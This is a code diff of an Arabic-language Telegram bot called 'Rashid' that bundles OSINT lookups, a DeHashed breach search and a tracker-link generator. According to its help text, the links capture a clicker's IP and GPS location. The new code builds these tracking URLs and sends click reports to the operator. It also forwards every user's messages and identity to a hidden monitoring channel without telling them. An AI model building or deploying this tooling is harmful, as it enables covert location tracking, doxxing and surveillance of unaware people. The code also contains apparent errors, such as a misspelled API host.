-    "m_grab":   "📡 رابط تعقب\n\nالأمر:\n`/grab تصنيف-اختياري`\nيولّد رابط يسحب IP+GPS عند الضغط.",
-    "m_mylogs": "📋 سجلاتك\n\nالأمر:\n`/mylogs`\nيعرض روابط التعقب التي ولّدتها.",
-    "m_vision": "🧠 تحليل صورة\n\nأرسل الصورة مع أو بدون وصف.\nسأحللها وأصفها وأستخرج النصوص.",
-    "m_about":  (
-        "معلومات راشد\n\n"
-        "الاسم    : راشد\n"
-        "الإصدار  : v3.0\n"
-        "المطور   : أبو سعود\n\n"
-        "الأنظمة المدمجة:\n"
-        "• Groq AI — LLaMA 3.3 70B + Vision\n"
-        "• Tavily — بحث فوري بالإنترنت\n"
-        "• VirusTotal — فحص الروابط\n"
-        "• DeHashed — قواعد التسريبات\n"
-        "• IPInfo — تحليل عناوين IP\n"
-        "• IP/GPS Logger — رصد الزوار\n\n"
-        "✦ راشد — تطوير أبو سعود"
-    ),
-}
-
-
-async def handle_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    data = q.data
-
-    if data == "m_main":
-        await q.edit_message_text(
-            "━━━━━━━━━━━━━━━━━━━━━\n⚡ [راشد // القائمة]\n━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "اختر الأداة:\n\n━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود",
-            reply_markup=main_kb(),
+        response = requests.get(
+            f"https://api.dehased.com/v2/search?query={query}",
+            headers=headers,
+            timeout=15
         )
-        return
+        response.raise_for_status()
+        data = response.json()
 
-    if data == "m_mylogs":
-        user = q.from_user
-        logs = user_logs.get(user.id, [])
-        if not logs:
-            await q.edit_message_text(
-                "📋 لا توجد سجلات بعد.\nاستخدم /grab لتوليد رابط تعقب.",
-                reply_markup=back_kb()
-            )
+        if data.get("success") and data.get("total") > 0:
+            report = "━━━━━━━━━━━━━━━━━━━━━\n"
+            report += f"🚨 [راشد // تقرير تسريبات]\n"
+            report += "━━━━━━━━━━━━━━━━━━━━━\n"
+            report += f"🔎 الاستعلام: {query}\n"
+            report += f"⚠️ عدد التسريبات: {data.get("total")}\n\n"
+            for item in data.get("data", [])[:3]:
+                report += f"▪ المصدر: {item.get("source", "N/A")}\n"
+                report += f"  تاريخ التسريب: {item.get("date", "N/A")}\n"
+                report += f"  النوع: {item.get("type", "N/A")}\n"
+                report += f"  الوصف: {item.get("description", "N/A")[:100]}...\n\n"
+            report += "━━━━━━━━━━━━━━━━━━━━━\n◈ تصميم وتطوير: أبو سعود"
+            return report
         else:
-            txt = "━━━━━━━━━━━━━━━━━━━━━\n📋 سجلاتك\n━━━━━━━━━━━━━━━━━━━━━\n\n"
-            for i, e in enumerate(logs[-6:], 1):
-                txt += f"[{i}] `{e['session_id']}` — {e['label']}\n🔗 {e['url']}\n\n"
-            txt += "◈ تصميم وتطوير: أبو سعود"
-            await q.edit_message_text(txt, reply_markup=back_kb(), parse_mode="Markdown")
+            return "✅ لا توجد تسريبات لهذا الاستعلام."
+
+    except requests.exceptions.HTTPError as e:
+        return f"⚠️ خطأ في الاتصال بـ DeHashed — كود: {e.response.status_code}"
+    except Exception as e:
+        return f"⚠️ خطأ غير متوقع: {str(e)[:100]}"
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🔗  توليد روابط التعقب | Tracker Link Generator
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def generate_tracker_link(user_id: int, label: str) -> str:
+    if not BOT_SERVER_URL:
+        return "⛔ رابط الخادم غير مُهيّأ. يرجى إعداد BOT_SERVER_URL في .env"
+    
+    session_id = hashlib.sha256(f"{user_id}-{label}-{datetime.now()}".encode()).hexdigest()[:10]
+    tracker_url = f"{BOT_SERVER_URL}/track/{user_id}/{session_id}"
+    
+    # Store the generated link in user_logs
+    user_logs[user_id].append({
+        "session_id": session_id,
+        "url": tracker_url,
+        "label": label,
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    })
+    
+    return tracker_url
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🤖  أوامر البوت | Bot Commands
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_name = user.first_name
+    
+    # Notify admin about new user
+    if str(user.id) != str(ADMIN_ID):
+        await context.bot.send_message(
+            chat_id=CONTROL_CHANNEL_ID,
+            text=f"🆕 مستخدم جديد بدأ البوت: {user.full_name} (ID: `{user.id}`)",
+            parse_mode=\'Markdown\'
+        )
+
+    keyboard = [
+        [InlineKeyboardButton("🔍 فحص أمني", callback_data=\'scan_info\'),
+         InlineKeyboardButton("🌐 بحث OSINT", callback_data=\'osint_info\')],
+        [InlineKeyboardButton("💻 مساعدة برمجية", callback_data=\'code_info\'),
+         InlineKeyboardButton("🔗 رابط تعقب", callback_data=\'tracker_info\')],
+        [InlineKeyboardButton("🤖 عن البوت", callback_data=\'about_info\')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    welcome_text = f"أهلاً بك {user_name} في **راشد الاستخباراتي 🤖**، من تصميم وتطوير أبو سعود.\nاختر أداة من الأسفل أو أرسل استفسارك."
+    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode=\'Markdown\')
+
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user = query.from_user
+    await query.answer()
+
+    responses = {
+        \'scan_info\': "استخدم الأمر /scan متبوعاً برابط أو IP للفحص الأمني.",
+        \'osint_info\': "استخدم الأمر /osint متبوعاً باسم أو موضوع للبحث الاستخباراتي.",
+        \'code_info\': "أرسل أي كود برمجي لتحليله.",
+        \'tracker_info\': "استخدم الأمر /track_link متبوعاً بتسمية للرابط (مثال: /track_link MyWebsite).",
+        \'about_info\': "راشد الاستخباراتي 🤖 هو مساعد ذكاء اصطناعي متقدم، من تصميم وتطوير أبو سعود."
+    }
+    
+    response_text = responses.get(query.data, "⚠️ أمر غير معروف.")
+    await query.edit_message_text(text=response_text)
+    
+    # Log button click to control channel
+    if str(user.id) != str(ADMIN_ID):
+        await context.bot.send_message(
+            chat_id=CONTROL_CHANNEL_ID,
+            text=f"🔘 المستخدم {user.full_name} (ID: `{user.id}`) ضغط على زر: {query.data}",
+            parse_mode=\'Markdown\'
+        )
+
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_msg = update.message.text
+    
+    # Admin Monitoring: Notify control channel about every message
+    if str(user.id) != str(ADMIN_ID):
+        admin_alert = (
+            f"💬 **رسالة مستخدم جديدة**\n"
+            f"👤 المستخدم: {user.full_name} (@{user.username})\n"
+            f"🆔 ID: `{user.id}`\n"
+            f"📝 الرسالة: {user_msg}"
+        )
+        await context.bot.send_message(chat_id=CONTROL_CHANNEL_ID, text=admin_alert, parse_mode=\'Markdown\')
+
+    # AI response
+    ai_reply = ask_groq(user_msg)
+    await update.message.reply_text(ai_reply)
+
+
+async def cmd_track_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if not context.args:
+        await update.message.reply_text("الرجاء تزويد تسمية للرابط. مثال: `/track_link MyWebsite`")
         return
-
-    if data in MENU_HELP:
-        await q.edit_message_text(MENU_HELP[data], reply_markup=back_kb(), parse_mode="Markdown")
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🚀  تشغيل البوت
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def clear_webhook():
-    """مسح أي webhook أو session قديم قبل البدء"""
-    for attempt in range(3):
-        try:
-            requests.post(
-                f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/deleteWebhook",
-                json={"drop_pending_updates": True},
-                timeout=10,
-            )
-            r = requests.post(
-                f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/close",
-                timeout=8,
-            )
-            print(f"[Startup] close API: {r.json()}")
-            time.sleep(4)
-            break
-        except Exception as e:
-            print(f"[Startup] clear_webhook attempt {attempt+1}: {e}")
-            time.sleep(3)
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  🌐  خادم Keep-Alive (UptimeRobot)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-_keep_alive_app = _Flask("keep_alive")
-
-
-@_keep_alive_app.route("/")
-def _home():
-    return "راشد — شغّال ✅", 200
-
-
-@_keep_alive_app.route("/ping")
-def _ping():
-    return "pong", 200
-
-
-def keep_alive():
-    t = Thread(
-        target=lambda: _keep_alive_app.run(host="0.0.0.0", port=8080),
-        daemon=True,
+    
+    label = " ".join(context.args)
+    tracker_url = generate_tracker_link(user.id, label)
+    
+    await update.message.reply_text(
+        f"🔗 تم إنشاء رابط التعقب بنجاح:\n`{tracker_url}`\n\n"\
+        f"عندما يضغط أي شخص على هذا الرابط، ستصلك تقارير مفصلة في قناتك الخاصة بالنتائج (`{TARGET_CHANNEL_ID}`)."
     )
-    t.start()
-    print("[Keep-Alive] خادم UptimeRobot جاهز على المنفذ 8080")
+    
+    # Log link generation to control channel
+    if str(user.id) != str(ADMIN_ID):
+        await context.bot.send_message(
+            chat_id=CONTROL_CHANNEL_ID,
+            text=f"🔗 المستخدم {user.full_name} (ID: `{user.id}`) أنشأ رابط تعقب: `{label}`\nالرابط: `{tracker_url}`",
+            parse_mode=\'Markdown\'
+        )
 
 
-def main():
-    if not MAIN_BOT_TOKEN:
-        raise RuntimeError("MAIN_BOT_TOKEN غير موجود!")
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  🚀  تشغيل البوت | Bot Startup
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-    keep_alive()
-    clear_webhook()
-
-    app = Application.builder().token(MAIN_BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start",    cmd_start))
-    app.add_handler(CommandHandler("help",     cmd_help))
-    app.add_handler(CommandHandler("code",     cmd_code))
-    app.add_handler(CommandHandler("ip",       cmd_ip))
-    app.add_handler(CommandHandler("scan",     cmd_scan))
-    app.add_handler(CommandHandler("osint",    cmd_osint))
-    app.add_handler(CommandHandler("user",     cmd_user))
-    app.add_handler(CommandHandler("grab",     cmd_grab))
-    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
-    app.add_handler(CommandHandler("dehashed", cmd_dehashed))
-    app.add_handler(CommandHandler("vt",       cmd_vt))
-    app.add_handler(CommandHandler("clear",    cmd_clear))
-
-    app.add_handler(MessageHandler(filters.PHOTO, handle_image))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_handler(CallbackQueryHandler(handle_cb))
-
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("⚡ راشد الاستخباراتي v3.0 — جاهز")
-    print(f"👤 معرّف المدير   : {ADMIN_ID}")
-    print(f"📋 قناة السجلات   : {TARGET_CHANNEL_ID}")
-    print(f"👁 قناة المراقبة  : {CONTROL_CHANNEL_ID}")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
-    app.run_polling(drop_pending_updates=True)
-
+def main_ai_bot():
+    app_tg = Application.builder().token(MAIN_BOT_TOKEN).build()
+    
+    app_tg.add_handler(CommandHandler("start", start))
+    app_tg.add_handler(CallbackQueryHandler(button_handler))
+    app_tg.add_handler(CommandHandler("track_link", cmd_track_link))
+    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    print(f"⚡ راشد الاستخباراتي (البوت الأساسي {MAIN_BOT_TOKEN.split(":")[0]}) يعمل...")
+    app_tg.run_polling()
 
 if __name__ == "__main__":
-    main()
+    main_ai_bot()
